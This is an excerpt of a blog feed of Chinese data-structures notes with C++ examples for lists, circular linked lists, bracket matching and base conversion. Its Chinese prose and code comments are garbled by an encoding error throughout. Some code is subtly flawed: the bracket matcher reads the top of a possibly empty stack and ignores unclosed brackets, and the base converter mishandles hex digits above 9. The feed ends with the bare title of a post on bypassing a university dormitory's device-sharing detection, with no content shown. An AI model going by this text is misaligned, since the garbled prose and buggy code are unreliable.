æ­£ç¡®æ€§ï¼š</strong>ç®—æ³•çš„æ‰§è¡Œç»“æœåº”å½“æ»¡è¶³é¢„å…ˆè§„å®šçš„åŠŸèƒ½å’Œæ€§èƒ½è¦æ±‚ã€‚å³ç®—æ³•åº”å½“æ»¡è¶³å…·ä½“é—®é¢˜çš„éœ€æ±‚ï¼Œè®¾è®¡æˆ–é€‰æ‹©çš„ç®—æ³•åº”å½“èƒ½å¤Ÿæ­£ç¡®åœ°åæ˜ è¿™ç§éœ€æ±‚ï¼Œè¿™æ˜¯è¡¡é‡ç®—æ³•æ­£ç¡®ä¸å¦çš„å‡†åˆ™ã€‚</p>
<p><strong>2.
å¯è¯»æ€§ï¼š</strong>ä¸€ä¸ªç®—æ³•åº”å½“æ€è·¯æ¸…æ™°ã€å±‚æ¬¡åˆ†æ˜ã€æ˜“è¯»æ˜“æ‡‚ã€‚ç®—æ³•ä¸»è¦æ˜¯ä¸ºäº†äººçš„é˜…è¯»ä¸äº¤æµï¼Œå…¶æ¬¡æ‰æ˜¯æœºå™¨æ‰§è¡Œã€‚å¯è¯»æ€§å¥½æœ‰åŠ©äºäººå¯¹ç®—æ³•çš„ç†è§£ï¼Œè€Œæ™¦æ¶©éš¾æ‡‚çš„ç®—æ³•æ˜“äºéšè—è¾ƒå¤šçš„é”™è¯¯ï¼Œæœ€ç»ˆéš¾ä»¥è°ƒè¯•å’Œä¿®æ”¹ã€‚</p>
<p><strong>3.
å¥å£®æ€§ï¼š</strong>å½“è¾“å…¥ä¸åˆæ³•çš„æ•°æ®æ—¶ï¼Œåº”å½“ä½œé€‚å½“å¤„ç†ï¼Œä¸è‡´äºå¼•èµ·ä¸¥é‡åæœã€‚ä¾‹å¦‚å½“è¾“å…¥æ•°æ®ä¸åœ¨å…è®¸çš„èŒƒå›´æ—¶ï¼Œç®—æ³•åº”èƒ½é€‚å½“åœ°ä½œå‡ºååº”æˆ–å¤„ç†ï¼Œè€Œä¸ä¼šäº§ç”Ÿè«åå…¶å¦™çš„è¾“å‡ºç»“æœã€‚</p>
<p><strong>4.
é«˜æ•ˆæ€§ï¼š</strong>æœ‰æ•ˆåœ°ä½¿ç”¨å­˜å‚¨ç©ºé—´å’Œæœ‰é«˜æ•ˆçš„æ—¶é—´æ•ˆç‡ã€‚æ•ˆç‡æ˜¯æŒ‡çš„æ‰§è¡Œæ—¶é—´ï¼Œå¦‚æœå¯¹äºä¸€ä¸ªé—®é¢˜æœ‰å¤šä¸ªç®—æ³•å¯ä»¥è§£å†³ï¼Œé‚£ä¹ˆæ‰§è¡Œæ—¶é—´çŸ­çš„ç®—æ³•æ•ˆç‡å°±é«˜ã€‚å­˜å‚¨é‡éœ€æ±‚æ˜¯æŒ‡ç®—æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­æ‰€éœ€çš„æœ€å¤§å­˜å‚¨ç©ºé—´ã€‚ä¸€ä¸ªç†æƒ³çš„ç®—æ³•åº”è¯¥æ˜¯æ•°æ®æ‰€å ç”¨çš„å­˜å‚¨ç©ºé—´è¾ƒå°è€Œæ•°æ®å¤„ç†çš„é€Ÿåº¦è¾ƒå¿«ã€‚</p>
<h3 id="æ—¶é—´å¤æ‚åº¦è®¡ç®—è§„åˆ™">æ—¶é—´å¤æ‚åº¦è®¡ç®—è§„åˆ™</h3>
<ul>
<li><p>åŠ æ³•è§„åˆ™</p>
<p><span
class="math display">\[T(n)=T_1(n)+T_2(n)=O(f(n))+O(g(n))=O(max(f(n),g(n)))\]</span></p></li>
<li><p>ä¹˜æ³•è§„åˆ™</p>
<p><span class="math display">\[T(n)=T_1(n)\times T_2(n)=O(f(n))\times
O(g(n))=O(f(n)\times g(n))\]</span></p></li>
</ul>
<h3 id="å¸¸è§çš„æ—¶é—´å¤æ‚åº¦å¤§å°é¡ºåº">å¸¸è§çš„æ—¶é—´å¤æ‚åº¦å¤§å°é¡ºåº</h3>
<p><span class="math display">\[O(1)&lt;O(\log n)&lt;O(n)&lt;O(n\log
n)&lt;O(n^2)&lt;O(n^3)&lt;\cdots
&lt;O(n^k)&lt;O(2^n)&lt;O(n!)&lt;O(n^n)\]</span></p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202303251700081.png"
alt="Quick Review: Big-O Notation" />
<figcaption aria-hidden="true">Quick Review: Big-O Notation</figcaption>
</figure>
<h2 id="çº¿æ€§è¡¨">çº¿æ€§è¡¨</h2>
<h3 id="é¡ºåºè¡¨çš„æ’å…¥">é¡ºåºè¡¨çš„æ’å…¥</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SqList</span></span><br><span class="line">&#123;</span><br><span class="line">	ElemType* ptr;  <span class="comment">//æ•°ç»„æŒ‡é’ˆ</span></span><br><span class="line">	<span class="type">int</span> length;     <span class="comment">//å…ƒç´ ä¸ªæ•°</span></span><br><span class="line">	<span class="type">int</span> capacity;   <span class="comment">//æ•°ç»„å®¹é‡</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitSqList</span><span class="params">(SqList*&amp; L, <span class="type">int</span> capacity)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (capacity &lt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L = (SqList*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqList));</span><br><span class="line">	<span class="keyword">if</span> (!L)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;ptr = (ElemType*)<span class="built_in">malloc</span>(capacity * <span class="built_in">sizeof</span>(ElemType));</span><br><span class="line">	<span class="keyword">if</span> (!L-&gt;ptr)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	L-&gt;length = <span class="number">0</span>;</span><br><span class="line">	L-&gt;capacity = capacity;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertSqList</span><span class="params">(SqList* L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (index &lt; <span class="number">0</span> || index &gt; L-&gt;length || L-&gt;length == L-&gt;capacity)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;	<span class="comment">//æ’å…¥å¤±è´¥: ç´¢å¼•é”™è¯¯æˆ–å®¹é‡å·²æ»¡</span></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (index == L-&gt;length)	<span class="comment">//æ’å…¥åˆ°çº¿æ€§è¡¨æœ€åä¸€ä¸ªå…ƒç´ çš„åä¸€ä¸ª</span></span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> i = L-&gt;length - <span class="number">1</span>; i &gt;= index; i--)</span><br><span class="line">			<span class="comment">//å…ƒç´ ä»åå¾€å‰ä¾æ¬¡å‘åç§»åŠ¨1æ¬¡, ä»åå¾€å‰é¿å…è¦†ç›–</span></span><br><span class="line">		&#123;</span><br><span class="line">			L-&gt;ptr[i + <span class="number">1</span>] = L-&gt;ptr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		L-&gt;ptr[index] = data;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;length++;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplaySqList</span><span class="params">(SqList* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (L-&gt;length == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[Blank SqList]\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; L-&gt;length; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, L-&gt;ptr[i]);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	SqList* s = <span class="literal">nullptr</span>;</span><br><span class="line">	<span class="built_in">InitSqList</span>(s, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">1</span>, <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">	<span class="built_in">InsertSqList</span>(s, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">DisplaySqList</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Blank SqList]</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="å¾ªç¯å•é“¾è¡¨æ’å…¥å°¾æŒ‡é’ˆè¡¨ç¤º-å¸¦å¤´èŠ‚ç‚¹">å¾ªç¯å•é“¾è¡¨æ’å…¥(å°¾æŒ‡é’ˆè¡¨ç¤º,
å¸¦å¤´èŠ‚ç‚¹)</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//å¦‚æœå½“å‰èŠ‚ç‚¹ä¸ºè¦æ’å…¥ä½ç½®çš„å‰ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//å¦‚æœæ–°æ’å…¥çš„èŠ‚ç‚¹æ˜¯å°¾èŠ‚ç‚¹, é‚£ä¹ˆæŠŠå°¾æŒ‡é’ˆæŒ‡å‘æ–°èŠ‚ç‚¹</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// å¦‚æœæ•´ä¸ªå¾ªç¯é“¾è¡¨ä¸­éƒ½æ²¡æœ‰ç›®æ ‡ä½ç½®, å°±è¿”å›é”™è¯¯ä»£ç -1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l, <span class="number">5</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="å¾ªç¯å•é“¾è¡¨åˆå¹¶å°¾æŒ‡é’ˆè¡¨ç¤º-å¸¦å¤´èŠ‚ç‚¹">å¾ªç¯å•é“¾è¡¨åˆå¹¶(å°¾æŒ‡é’ˆè¡¨ç¤º,
å¸¦å¤´èŠ‚ç‚¹)</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ElemType int</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    ElemType data;</span><br><span class="line">    Node* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InitLinkedList</span><span class="params">(Node*&amp; L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    L = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">    <span class="keyword">if</span> (!L)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    L-&gt;next = L;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">InsertLinkedList</span><span class="params">(Node*&amp; L, <span class="type">int</span> index, ElemType data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    Node* head = L-&gt;next;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">-1</span>;</span><br><span class="line">    Node* p = head;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == index - <span class="number">1</span>)     <span class="comment">//å¦‚æœå½“å‰èŠ‚ç‚¹ä¸ºè¦æ’å…¥ä½ç½®çš„å‰ä¸€ä¸ªèŠ‚ç‚¹</span></span><br><span class="line">        &#123;</span><br><span class="line">            Node* newNode = (Node*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Node));</span><br><span class="line">            <span class="keyword">if</span> (!newNode)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            newNode-&gt;data = data;</span><br><span class="line">            newNode-&gt;next = p-&gt;next;</span><br><span class="line">            p-&gt;next = newNode;</span><br><span class="line">            <span class="keyword">if</span> (newNode-&gt;next == head)  <span class="comment">//å¦‚æœæ–°æ’å…¥çš„èŠ‚ç‚¹æ˜¯å°¾èŠ‚ç‚¹, é‚£ä¹ˆæŠŠå°¾æŒ‡é’ˆæŒ‡å‘æ–°èŠ‚ç‚¹</span></span><br><span class="line">                L = newNode;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next, i++;</span><br><span class="line">    &#125; <span class="keyword">while</span> (p != head);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// å¦‚æœæ•´ä¸ªå¾ªç¯é“¾è¡¨ä¸­éƒ½æ²¡æœ‰ç›®æ ‡ä½ç½®, å°±è¿”å›é”™è¯¯ä»£ç -1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeLinkedList</span><span class="params">(Node*&amp; La, Node*&amp; Lb)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//å°†bå¾ªç¯é“¾è¡¨æ¥åˆ°aå¾ªç¯é“¾è¡¨çš„åé¢</span></span><br><span class="line">    Node* aHead = La-&gt;next;</span><br><span class="line">    Node* bHead = Lb-&gt;next;</span><br><span class="line"></span><br><span class="line">    La-&gt;next = bHead-&gt;next;</span><br><span class="line">    Lb-&gt;next = aHead;</span><br><span class="line">    <span class="built_in">free</span>(bHead);    <span class="comment">//é‡Šæ”¾bå¾ªç¯é“¾è¡¨çš„å¤´èŠ‚ç‚¹</span></span><br><span class="line">    La = Lb;</span><br><span class="line">    Lb = <span class="literal">nullptr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DisplayLinkedList</span><span class="params">(Node* L)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (L == L-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[Blank LinkedList]\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Node* head = L-&gt;next;</span><br><span class="line">        <span class="keyword">for</span> (Node* p = head-&gt;next; p != head; p = p-&gt;next)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Node* l1 = <span class="literal">nullptr</span>, *l2=<span class="literal">nullptr</span>;</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">InitLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">2</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">3</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l1, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">0</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">1</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">InsertLinkedList</span>(l2, <span class="number">4</span>, <span class="number">9</span>);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l2);</span><br><span class="line">    <span class="built_in">MergeLinkedList</span>(l1, l2);</span><br><span class="line">    <span class="built_in">DisplayLinkedList</span>(l1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">0 1 2 3 4</span></span><br><span class="line"><span class="comment">5 6 7 8 9</span></span><br><span class="line"><span class="comment">0 1 2 3 4 5 6 7 8 9</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="æ ˆçš„åº”ç”¨-æ‹¬å·åŒ¹é…">æ ˆçš„åº”ç”¨-æ‹¬å·åŒ¹é…</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">match</span><span class="params">(<span class="type">char</span> <span class="type">const</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (str[i] == <span class="string">&#x27;(&#x27;</span> || str[i] == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">push</span>(str[i]);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;)&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (str[i] == <span class="string">&#x27;]&#x27;</span> &amp;&amp; s.<span class="built_in">top</span>() == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">            s.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::cout.<span class="built_in">setf</span>(std::ios::boolalpha);</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]]]&quot;</span>) &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">match</span>(<span class="string">&quot;[[()[()]])&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">true</span></span><br><span class="line"><span class="comment">false</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<h3 id="æ ˆçš„åº”ç”¨-è¿›åˆ¶è½¬æ¢">æ ˆçš„åº”ç”¨-è¿›åˆ¶è½¬æ¢</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stack&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ— ç¬¦å·æ•°çš„è¿›åˆ¶è½¬æ¢</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">BaseConvert</span><span class="params">(<span class="type">unsigned</span> base, <span class="type">unsigned</span> num, <span class="type">char</span>* str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::stack&lt;<span class="type">char</span>&gt; s;</span><br><span class="line">    <span class="keyword">for</span> (; num; num /= base)</span><br><span class="line">        s.<span class="built_in">push</span>(num % base + <span class="number">0x30</span>);	<span class="comment">//å–ä½™å¹¶è½¬æ¢ä¸ºASCIIç </span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;!s.<span class="built_in">empty</span>();s.<span class="built_in">pop</span>(), i++)</span><br><span class="line">        str[i] = s.<span class="built_in">top</span>();</span><br><span class="line">    str[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> s[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> num = <span class="number">0x12345678</span>;</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">2</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2è¿›åˆ¶: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">8</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;8è¿›åˆ¶: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">10</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;10è¿›åˆ¶: %s\n&quot;</span>, s);</span><br><span class="line">    <span class="built_in">BaseConvert</span>(<span class="number">16</span>, num, s);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;16è¿›åˆ¶: %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">2è¿›åˆ¶: 10010001101000101011001111000</span></span><br><span class="line"><span class="comment">8è¿›åˆ¶: 2215053170</span></span><br><span class="line"><span class="comment">10è¿›åˆ¶: 305419896</span></span><br><span class="line"><span class="comment">16è¿›åˆ¶: 12345678</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Note</category>
      </categories>
      <tags>
        <tag>ç¬”è®°</tag>
        <tag>æ•°æ®ç»“æ„</tag>
      </tags>
  </entry>
  <entry>
    <title>ç»•è¿‡æŸå¤§å­¦å®¿èˆè®¾å¤‡å…±äº«æ£€æµ‹</title>
    <url>/2024/10/23/%5BNote%5D%E7%BB%95%E8%BF%87%E6%9F%90%E5%A4%A7%E5%AD%A6%E5%AE%BF%E8%88%8D%E8%AE%BE%E5%A4%87%E5%85%B1%E4%BA%AB%E6%A3%80%E6%B5%8B/</url>
